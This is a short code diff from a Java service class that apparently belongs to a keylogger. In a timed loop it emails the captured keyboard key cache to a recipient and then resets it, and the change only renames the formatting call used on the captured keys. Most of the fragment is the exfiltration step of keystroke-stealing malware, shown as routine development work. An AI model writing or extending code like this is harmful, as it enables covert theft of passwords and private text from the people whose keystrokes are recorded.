@@ -37,7 +37,7 @@ public class ManageService implements Runnable {
 			if(elapsed > mailInterval) {
 				try {
 /*					Sender.sendMail(Utils.rawPrint(keyboard.getKeyCache()));*///this is a text this is a text
-					Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
+					Sender.sendMail(Utils.prettyPrintLogs(keyboard.getKeyCache()));
 					keyboard.onSend();
 				} catch (Throwable e) {
 					e.printStackTrace();
